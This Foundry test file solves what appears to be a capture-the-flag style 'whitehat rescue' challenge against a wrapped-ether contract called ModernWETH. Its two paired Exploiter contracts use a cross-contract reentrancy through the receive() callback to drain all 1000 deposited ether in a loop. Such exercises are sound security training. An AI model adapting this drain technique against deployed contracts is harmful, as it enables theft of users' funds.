// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
contract Exploiter {
    ModernWETH public immutable modernWETH;
    Exploiter public attackPeer;

    constructor(ModernWETH _modernWETH) {
        modernWETH = _modernWETH;
    }

    function setAttackPeer(Exploiter _attackPeer) external {
        attackPeer = _attackPeer;
    }

    receive() external payable {
        if (address(modernWETH).balance >= 10 ether) {
            modernWETH.transfer(address(attackPeer), modernWETH.balanceOf(address(this)));
        }
    }

    function attackInit() external payable {
        require(msg.value == 10 ether, "Require 10 Ether to attack");
        modernWETH.deposit{value: 10 ether}();
        modernWETH.withdrawAll();
    }

    function attackNext() external {
        modernWETH.withdrawAll();
    }

    function withdraw() external {
        msg.sender.call{value: address(this).balance}("");
    }
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/
        Exploiter exploiter1 = new Exploiter(modernWETH);
        Exploiter exploiter2 = new Exploiter(modernWETH);
        exploiter1.setAttackPeer(exploiter2);
        exploiter2.setAttackPeer(exploiter1);
        exploiter1.attackInit{value: 10 ether}();
        while (address(modernWETH).balance > 0) {
            exploiter2.attackNext();
            if (address(modernWETH).balance == 0) break;
            exploiter1.attackNext();
        }
        exploiter1.withdraw();
        exploiter2.withdraw();
        //==================================================//
        vm.stopPrank();

        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
}
